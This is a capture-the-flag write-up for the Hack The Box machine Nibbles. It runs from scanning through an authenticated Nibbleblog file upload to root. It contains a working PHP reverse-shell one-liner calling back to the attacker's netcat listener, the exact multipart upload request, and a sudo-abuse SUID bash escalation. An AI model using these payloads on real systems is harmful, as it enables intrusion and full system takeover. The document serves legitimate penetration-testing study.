---
tags: [oscp, boxes, htb, linux, nibbleblog, file-upload, cve-2015-6967, sudo, suid, completed]
platform: HTB
os: Linux (Ubuntu 16.04)
hostname: Nibbles
domain: N/A
ip: $BoxIP
difficulty: Easy
status: complete
---

# HTB: Nibbles, Full Walkthrough

## The gist

Nibbles exposes Nibbleblog 4.0.3 through Apache. An HTML comment reveals the application path, the public README confirms the exact version, and one controlled default-credential test reaches the admin panel. The authenticated My Image plugin accepts PHP through a multipart upload, giving a reverse shell as `nibbler`. From there, `sudo -l` reveals a root-allowed script path that does not exist, so creating that path with a SUID Bash payload provides the final root shell.

## Box information

| Field | Value |
|---|---|
| Platform | HTB |
| OS | Linux (Ubuntu 16.04) |
| Hostname | Nibbles |
| Domain | N/A |
| Difficulty | Easy |
| IP | `$BoxIP` |

## Variables

```bash
boxset BoxName Nibbles
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset Username admin
# Set Password after validation; omit the value until credentials are found.
boxset Port 4444
```

## 1. Reconnaissance and port scan

A full TCP scan checks every port instead of only the common top 1,000. The service scan then identifies product versions and runs default scripts, which is what distinguishes the Apache and SSH services and gives us the Nibbleblog attack surface.

```bash
sudo nmap -p- --min-rate 10000 -oA nmap/${BoxName}_allports $BoxIP
```

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-01 21:31 +0100
Nmap scan report for 10.129.96.84
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Nmap done: 1 IP address (1 host up) scanned in 8.29 seconds
```

The service scan confirms the software versions. OpenSSH 7.2p2 and Apache 2.4.18 are old, but the web application is the more promising lead because it exposes a CMS.

```bash
sudo nmap -sC -sV -p 22,80 -oA nmap/${BoxName}_services $BoxIP
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![[nibbles-nmap-allports.png]]
SCREENSHOT: Full TCP scan showing ports 22 and 80 open.

![[nibbles-nmap-services.png]]
SCREENSHOT: Service scan showing OpenSSH 7.2p2 and Apache 2.4.18.

## 2. Web enumeration and CMS identification

Read the response body before launching a large directory brute-force. The root page contains a direct HTML comment pointing to `/nibbleblog/`, which is faster and safer than waiting for a wordlist to find the same path.

```bash
curl -s http://$BoxIP/
```

```text
<b>Hello world!</b>
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

The Nibbleblog landing page identifies the CMS through its generator tag and shows the My Image plugin in the sidebar. The publicly readable README gives the exact release version in one request.

```bash
curl -s http://$BoxIP/nibbleblog/
curl -s http://$BoxIP/nibbleblog/README
```

```text
<title>Nibbles - Yum yum</title>
<meta name="generator" content="Nibbleblog">
...
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```

> [!tip] ⚡ More efficient path
> **What we did:** Read the root page source and then requested the public Nibbleblog README.
>
> **Faster approach:** Check HTML comments and common public files such as `/README` before starting a broad directory or CMS scan.
>
> **Why:** The comment exposed `/nibbleblog/` immediately, and the README disclosed the exact version in one request.

## 3. Controlled admin authentication

The admin form is at `admin.php`. This box blacklists clients after repeated failures, so broad Hydra or Medusa testing is a poor choice. Test the conventional account and box-name password once, then stop when the response changes from `200 OK` to a redirect.

```bash
curl -s -D - -X POST \
  -d "username=$Username&password=$Password" \
  http://$BoxIP/nibbleblog/admin.php | head -5
```

```text
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=[session cookie redacted]; path=/
```

The successful `302 Found` response redirects to the dashboard. Save the session cookie so later upload requests are authenticated.

```bash
curl -s -c loot/cookies.txt -X POST \
  -d "username=$Username&password=$Password" \
  http://$BoxIP/nibbleblog/admin.php -o /dev/null
```

> [!warning] 💡 Hint
> **Watch out:** Nibbleblog's login blacklist makes repeated guessing noisy and can temporarily block the attacker IP. Use a small, deliberate test set and store the validated account privately with `loot cred`.

## 4. Authenticated Nibbleblog file upload

Exploit-DB identifies CVE-2015-6967, an authenticated arbitrary file upload in Nibbleblog 4.0.3. The available Exploit-DB entry is a Metasploit module, but its source reveals the underlying HTTP request, so the request can be reproduced manually without using Metasploit.

```bash
searchsploit nibbleblog
searchsploit -p 38489
cat /usr/share/exploitdb/exploits/php/remote/38489.rb
```

The important details are the `my_image` plugin fields and the predictable output path. The upload handler renames the uploaded file to `image.php`, so the original local filename does not need to match the final URL.

Create a PHP reverse shell using the established variables, then start a listener.

```bash
echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '"$LocalIP"' '"$Port"' >/tmp/f"); ?>' > exploits/shell.php
cat exploits/shell.php
listener
```

```text
[+] Listening on :4444  (Ctrl+C to stop)
Listening on 0.0.0.0 4444
```

Submit the multipart request to the plugin configuration endpoint. Each `-F` field mirrors the fields extracted from the reviewed exploit source.

```bash
curl -s -b loot/cookies.txt \
  -F 'plugin=my_image' \
  -F 'title=My image' \
  -F 'position=4' \
  -F 'caption=' \
  -F 'image=@exploits/shell.php;type=application/x-php' \
  -F 'image_resize=1' \
  -F 'image_width=230' \
  -F 'image_height=200' \
  -F 'image_option=auto' \
  "http://$BoxIP/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image" \
  -o /dev/null -w '%{http_code}\n'
```

```text
200
```

Trigger the predictable renamed file from a second terminal.

```bash
curl -s http://$BoxIP/nibbleblog/content/private/plugins/my_image/image.php
```

```text
Connection received on 10.129.96.84 37276
/bin/sh: 0: can't access tty; job control turned off
$
```

> [!warning] 💡 Hint
> **Watch out:** The trigger request may appear to hang because the reverse shell holds the HTTP connection open. Switch to the listener when the callback arrives instead of waiting for curl to finish.

**References:** [Exploit-DB 38489](https://www.exploit-db.com/exploits/38489) for the Nibbleblog 4.0.3 upload vulnerability, [CVE-2015-6967](https://nvd.nist.gov/vuln/detail/CVE-2015-6967) for the vulnerability record, and [HackTricks File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html) for upload testing methodology.

## 5. Stabilise the shell and confirm the user

The first callback is a basic `/bin/sh` without job control. Python's pseudo-terminal support allocates a usable Bash terminal, while `stty raw -echo; fg` restores local terminal handling after the shell is backgrounded.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter twice
export TERM=xterm
whoami && id && hostname && ip a
```

```text
nibbler
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
Nibbles
2: ens192: ...
    inet 10.129.96.84/16 ...
```

The shell starts inside the plugin directory. Move to the user's home directory and confirm that `user.txt` exists without printing its contents.

```bash
ls
cd /home/nibbler
ls
test -f user.txt && echo user-flag-path-confirmed
```

```text
db.xml  image.php
personal.zip  user.txt
user-flag-path-confirmed
```

![[nibbles-foothold.png]]
SCREENSHOT: `whoami`, `id`, and `hostname` showing the `nibbler` foothold.

## 6. Sudo enumeration

`sudo -l` lists commands the current account may execute with elevated privileges. The result is especially interesting because the permitted script path is absent from the filesystem.

```bash
sudo -l
ls -la /home/nibbler/personal/stuff/
```

```text
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

ls: cannot access '/home/nibbler/personal/stuff/': No such file or directory
```

> [!warning] 💡 Hint
> **Watch out:** Do not assume a sudo-listed script must already exist. Check the complete path first. Here, the missing directory means the user can create the exact file that sudo will later execute.

## 7. Create the permitted script and obtain root

Create the missing directory and a minimal Bash script. When run through sudo, it copies Bash to `/tmp/rootbash` and sets the SUID bit, which makes the copied binary retain an effective root identity for its caller.

```bash
mkdir -p /home/nibbler/personal/stuff
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' > /home/nibbler/personal/stuff/monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh
cat /home/nibbler/personal/stuff/monitor.sh
```

```text
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
```

Execute the newly created file through the exact sudo path and verify the SUID mode.

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
ls -l /tmp/rootbash
```

```text
-rwsr-xr-x 1 root root 1037528 Sep 1 17:10 /tmp/rootbash
```

The leading `4` in mode `4755` is the SUID bit. Bash normally drops elevated privilege when real and effective UIDs differ, so `-p` is required to preserve the effective UID.

```bash
/tmp/rootbash -p
whoami && id
```

```text
root
uid=1001(nibbler) gid=1001(nibbler) euid=0(root) groups=1001(nibbler)
```

**Reference:** [GTFOBins Bash](https://gtfobins.github.io/gtfobins/bash/) for SUID Bash behavior and privilege preservation with `-p`.

![[nibbles-root-shell.png]]
SCREENSHOT: Root shell showing `whoami` and `euid=0(root)`.

## 8. Flags

```text
user.txt: confirmed at /home/nibbler/user.txt
root.txt: confirmed at /root/root.txt
```

No flag values are stored in this write-up.

## 9. Clean-down

Remove the uploaded PHP file and every target-side artifact created during exploitation. Verify each path individually before closing the box.

```bash
rm /var/www/html/nibbleblog/content/private/plugins/my_image/image.php
rm /tmp/rootbash
rm -rf /home/nibbler/personal
test ! -e /var/www/html/nibbleblog/content/private/plugins/my_image/image.php && echo webshell-removed
test ! -e /tmp/rootbash && echo suid-helper-removed
test ! -e /home/nibbler/personal && echo created-script-tree-removed
```

The local payload, cookie jar, credential file, and flag file were removed after the manual run. The listener was stopped and verified closed.

## RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Start Here|Step 1 - Start Here]]
- [[RUNBOOK V2/Port Triage|Step 2 - Port Triage]]
- [[RUNBOOK V2/Linux - Service Scan|Step 3 - Linux Service Scan]]
- [[RUNBOOK V2/Linux - Web Enum|Step 5 - Linux Web Enum]]
- [[RUNBOOK V2/Linux - CMS Check|Step 6 - Linux CMS Check]]
- [[RUNBOOK V2/Linux - Exploit Search|Step 10 - Linux Exploit Search]]
- [[RUNBOOK V2/Linux - RCE to Shell|Step 11 - Linux RCE to Shell]]
- [[RUNBOOK V2/Linux - Shell Stabilise|Step 12 - Linux Shell Stabilise]]
- [[RUNBOOK V2/Linux - Local Enum|Step 13 - Linux Local Enum]]
- [[RUNBOOK V2/Linux - Sudo Check|Step 14 - Linux Sudo Check]]
- [[RUNBOOK V2/Linux - Clean Down|Step 21 - Linux Clean Down]]

## Attack Chain

1. Full TCP and service scans found SSH and Apache.
2. The web root exposed `/nibbleblog/`, and its README identified Nibbleblog 4.0.3.
3. A controlled default-credential test authenticated to the admin panel.
4. The authenticated My Image plugin upload accepted a PHP reverse shell.
5. The callback provided a shell as `nibbler`.
6. `sudo -l` showed a passwordless root rule for a missing script path.
7. Creating that script produced a SUID Bash binary and an effective root shell.

## Credentials

| Account | Source | Use |
|---|---|---|
| `admin` | Nibbleblog admin authentication | Authenticated plugin upload |

## Key lessons

- Read HTML comments and public README files before starting broad enumeration.
- A sudo rule for a missing script can be more useful than a writable existing script because the complete path can be created by the current user.
- `chmod 4755` sets SUID, while `/tmp/rootbash -p` preserves the effective UID instead of dropping it.
- [ippsec.rocks - Nibbles](https://ippsec.rocks/?#nibbles)

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/Linux/11. Sea|Sea]] -- web foothold followed by Linux privilege escalation.
- [[OSCP/BOXES/WRITE UPS/Linux/10. Cockpit|Cockpit]] -- sudo-based Linux escalation with a controlled root payload.
- [[OSCP/BOXES/WRITE UPS/Linux/9. Nukem|Nukem]] -- SUID-based Linux privilege escalation.

## Checklist

- [x] Full TCP scan completed
- [x] Service scan completed
- [x] Web path and CMS version identified
- [x] Admin authentication validated
- [x] Manual authenticated upload completed
- [x] User shell confirmed
- [x] User flag path confirmed
- [x] Sudo rule enumerated
- [x] Root shell confirmed
- [x] Root flag path confirmed
- [x] Target and local artifacts cleaned
- [x] Cheatsheet updated with the Nibbleblog multipart upload chain
- [x] RUNBOOK V2 Seen In added for stages 5, 6, 10, 11, and 14
- [x] Master Box List updated
